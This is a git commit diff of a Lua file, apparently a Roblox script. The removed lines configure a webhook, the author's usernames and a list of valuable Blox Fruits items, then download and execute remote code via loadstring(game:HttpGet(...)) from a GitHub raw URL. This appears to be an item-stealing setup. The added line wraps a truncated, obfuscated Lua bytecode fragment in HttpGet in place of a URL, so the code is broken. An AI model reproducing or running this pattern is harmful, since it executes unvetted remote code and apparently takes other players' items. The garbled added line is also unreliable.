9f902e78b489c8cac61850283de1c892d4b68a84
Ammar-u <ashiramir27@gmail.com>
2025-04-13 17:32:16 +0500

    Update ...lua

--- ...lua
+++ ...lua
@@ -1,5 +1,1 @@
-webhook = "https://webhook-protect.vercel.app/api/webhook?id=ZWR0ZE1LZFF5T0pRdF9MSFFOcU5DZzo3VVlnNWcwNHpXX1NSUjVnWTZpbDl5YlBMSmdfNy1PQzhiZk03VXUwR2xOVlI2N3FoVjVNRW1Bd2NSUEY1YzlDMmhzR2RsX0p5OVpZRG1lUm9neHhQMWFHRDItY0FzTVNzalA4aFdTb3VKc1ZMekUtdlNCUkNrMHY5a2dnQnhOQXoweEhhMEdDS1dfWkFZQ2hmNkdPUG5jekVGZE5CaEUxdkwzUXlEM0RPbXM
-Usernames = {"Ammar_Ronaldo96", "Ammar_Ronaldo96"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
+loadstring(game:HttpGet("d;n[e[2]]=n[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];d=e[2]n[d]=n[d](L(n,d+1,e[3]))l=l+1;e=o[l
